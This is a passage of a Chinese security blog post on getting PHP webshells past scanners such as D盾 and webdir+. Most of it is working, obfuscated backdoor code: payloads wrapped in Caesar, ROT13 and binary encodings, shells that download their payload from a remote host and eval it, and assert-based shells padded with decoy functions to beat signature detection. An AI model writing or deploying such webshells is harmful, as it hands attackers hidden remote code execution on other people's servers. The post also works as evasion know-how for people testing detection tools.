class="variable">$v</span> &lt;&lt;= <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$QSFX</span>[<span class="variable">$i</span>] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; <span class="variable">$QSFX</span>[<span class="variable">$i</span>] &lt;= <span class="string">&#x27;z&#x27;</span>)&#123;</span><br><span class="line">          <span class="variable">$v</span> += (<span class="title function_ invoke__">ord</span>(<span class="variable">$QSFX</span>[<span class="variable">$i</span>]) - <span class="number">97</span>);</span><br><span class="line">      &#125; <span class="keyword">elseif</span> (<span class="variable">$QSFX</span>[<span class="variable">$i</span>] &gt;= <span class="string">&#x27;2&#x27;</span> &amp;&amp; <span class="variable">$QSFX</span>[<span class="variable">$i</span>] &lt;= <span class="string">&#x27;7&#x27;</span>) &#123;</span><br><span class="line">          <span class="variable">$v</span> += (<span class="number">24</span> + <span class="variable">$QSFX</span>[<span class="variable">$i</span>]);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$vbits</span> += <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="variable">$vbits</span> &gt;= <span class="number">8</span>)&#123;</span><br><span class="line">          <span class="variable">$vbits</span> -= <span class="number">8</span>;</span><br><span class="line">          <span class="variable">$NLHB</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &gt;&gt; <span class="variable">$vbits</span>);</span><br><span class="line">          <span class="variable">$v</span> &amp;= ((<span class="number">1</span> &lt;&lt; <span class="variable">$vbits</span>) - <span class="number">1</span>);&#125;&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$NLHB</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/19/Webshell-Bypass/2.png" alt="image"></p>
-<ul>
-<li>ascii码移位payload（凯撒加密）</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FKPC</span></span>&#123;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;TQYV = <span class="string">&quot;bs^i%!\MLPQXwbolZ&amp;8&quot;</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;WZDM = @<span class="title function_ invoke__">HHGJ</span>(<span class="variable">$this</span>-&gt;TQYV);</span><br><span class="line">      @<span class="keyword">eval</span>(<span class="string">&quot;/*#jkskjwjqo*/&quot;</span>.<span class="variable language_">$this</span>-&gt;WZDM.<span class="string">&quot;/*sj#ahajsj*/&quot;</span>);</span><br><span class="line">      &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FKPC</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HHGJ</span>(<span class="params"><span class="variable">$UyGv</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$svfe</span> = [];</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$UyGv</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$svfe</span>[] = <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$f</span>[<span class="variable">$i</span>])+<span class="number">3</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="title function_ invoke__">implode</span>(<span class="variable">$svfe</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$mxAS</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/19/Webshell-Bypass/3.png" alt="image"></p>
-<p>居然没过webdir+</p>
-<p>那如何解决呢 我们后面再说 当然应付D盾还是绰绰有余了</p>
-<p><img src="/2024/01/19/Webshell-Bypass/4.png" alt="image"></p>
-<p>Rot13加密payload</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$DAXW</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$LRXV</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;DAXW = <span class="string">&#x27;riny($_CBFG[mreb]);&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;LRXV = @<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$this</span>-&gt;DAXW);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;LRXV.<span class="string">&quot;/*GnSpe=u*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>二进制转化payload</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$DAXW</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$LRXV</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;DAXW = <span class="string">&#x27;1100101 1110110 1100001 1101100 101000 100100 1011111 1010000 1001111 1010011 1010100 1011011 1111010 1100101 1110010 1101111 1011101 101001 111011&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;LRXV = @<span class="title function_ invoke__">BinToStr</span>(<span class="variable">$this</span>-&gt;DAXW);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;LRXV.<span class="string">&quot;/*GnSpe=u*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BinToStr</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> &amp;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="variable">$v</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;H&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">base_convert</span>(<span class="variable">$v</span>, <span class="number">2</span>, <span class="number">16</span>)), <span class="title function_ invoke__">base_convert</span>(<span class="variable">$v</span>, <span class="number">2</span>, <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">join</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arr</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/19/Webshell-Bypass/5.png" alt="image"></p>
-<p>这里就不列举了 只要方法正确 绕过杀软是很简单的</p>
-</blockquote>
-<h3><span id="0x02通过http获得关键参数">0x02：通过http获得关键参数</span></h3><blockquote>
-<p>上面那个凯撒密码不是被webdir+杀了吗 我们在这里将他绕过</p>
-<p>众所周知凯撒密码需要设置往前或往后移几位ascii 这个参数可以设置为解密方法的输入参数 经过测试 此参数在源码中会被沙盒跑出了 因此不能过百度杀毒 ，那么 我不写本地不就行了 我直接起一个http服务访问文本获得参数值。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FKPC</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://xxxxx:8080/1.txt&quot;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$url</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">stream_get_meta_data</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="variable">$body</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$body</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;TQYV = <span class="string">&quot;bs^i%!\MLPQXwbolZ&amp;8&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;WZDM = @<span class="title function_ invoke__">HHGJ</span>(<span class="variable">$this</span>-&gt;TQYV,<span class="variable">$this</span>-&gt;x);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*#jkskjwjqo*/&quot;</span>.<span class="variable language_">$this</span>-&gt;WZDM.<span class="string">&quot;/*sj#ahajsj*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FKPC</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HHGJ</span>(<span class="params"><span class="variable">$UyGv</span>,<span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$svfe</span> = [];</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$UyGv</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$svfe</span>[] = <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$f</span>[<span class="variable">$i</span>])+<span class="variable">$x</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="title function_ invoke__">implode</span>(<span class="variable">$svfe</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$mxAS</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/19/Webshell-Bypass/6.png" alt="image"></p>
-<p>当然肯定能用</p>
-<p><img src="/2024/01/19/Webshell-Bypass/7.png" alt="image"></p>
-<p>但是 这转了一圈简直不低碳啊 我不能直接http获取payload吗 …</p>
-<p>简化代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;yshasaui&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://xxx/1.txt&quot;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$url</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">stream_get_meta_data</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="variable">$body</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$body</span>;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=121u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;b.<span class="string">&quot;/*Gn212Spe=u*/&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/19/Webshell-Bypass/8.png" alt="image"></p>
-<p><img src="/2024/01/19/Webshell-Bypass/9.png" alt="image"></p>
-</blockquote>
-<h3><span id="0x03重写函数bypass">0x03：重写函数Bypass</span></h3><blockquote>
-<p>众所周知 正则类杀软最喜欢直接把危险函数加入规则 那么 它杀的是函数名 还是逻辑呢？</p>
-<p>试一试就知道了</p>
-<p>我们的样本如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">substr</span>(<span class="string">&quot;assertxx&quot;</span>,<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这是个使用substr函数切割关键字的小马</p>
-<p>直接扔到webdir+杀</p>
-<p><img src="/2024/01/19/Webshell-Bypass/10.png" alt="image"></p>
-<p>毫无疑问的被杀了</p>
-<p>那么 我们重写substr函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$start</span> = <span class="number">0</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$strLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$length</span> = <span class="variable">$strLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$length</span> = (<span class="keyword">int</span>) <span class="variable">$length</span>;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$start</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$start</span>) : (<span class="variable">$start</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="variable">$length</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$length</span>) : <span class="variable">$start</span> + <span class="variable">$length</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$start</span> &gt; <span class="variable">$strLength</span> || (<span class="variable">$end</span> - <span class="variable">$start</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$start</span> &lt; <span class="variable">$end</span>; <span class="variable">$start</span> ++) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="variable">$string</span>[<span class="variable">$start</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后把函数替换</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;assert(xyz@&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> =  <span class="title function_ invoke__">mysubstr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$start</span> = <span class="number">0</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$strLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$length</span> = <span class="variable">$strLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$length</span> = (<span class="keyword">int</span>) <span class="variable">$length</span>;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$start</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$start</span>) : (<span class="variable">$start</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="variable">$length</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$length</span>) : <span class="variable">$start</span> + <span class="variable">$length</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$start</span> &gt; <span class="variable">$strLength</span> || (<span class="variable">$end</span> - <span class="variable">$start</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$start</span> &lt; <span class="variable">$end</span>; <span class="variable">$start</span> ++) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="variable">$string</span>[<span class="variable">$start</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>再拿去杀</p>
-<p><img src="/2024/01/19/Webshell-Bypass/11.png" alt="image"></p>
-<p>结论很清楚了</p>
-<p>再来D盾杀一下</p>
-<p><img src="/2024/01/19/Webshell-Bypass/12.png" alt="image"></p>
-<p>不错 报2级了 这就是沙盒型查杀和正则类查杀的明显区别 怎么过呢 用构造方法即可</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> pure;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$start</span> = <span class="number">0</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$strLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$length</span> = <span class="variable">$strLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$length</span> = (<span class="keyword">int</span>) <span class="variable">$length</span>;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$start</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$start</span>) : (<span class="variable">$start</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="variable">$length</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$length</span>) : <span class="variable">$start</span> + <span class="variable">$length</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$start</span> &gt; <span class="variable">$strLength</span> || (<span class="variable">$end</span> - <span class="variable">$start</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$start</span> &lt; <span class="variable">$end</span>; <span class="variable">$start</span> ++) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="variable">$string</span>[<span class="variable">$start</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/19/Webshell-Bypass/13.png" alt="image"></p>
-<p>看到这里大家可能也很奇怪 这里都没用到mysubstr函数 放上去不是多此一举吗</p>
-<p>不好意思 恰恰不是 我们可以去掉这个函数 用D盾杀一下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> pure;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/01/19/Webshell-Bypass/14.png" alt="image"></p>
-<p>怎么样 是不是很有趣</p>
-<p>这里放这堆代码并不是为了真的用它 而是为了过D盾的特征查杀 所以放什么函数是无所谓的。</p>
-<p>比如这样：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> pure;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>) 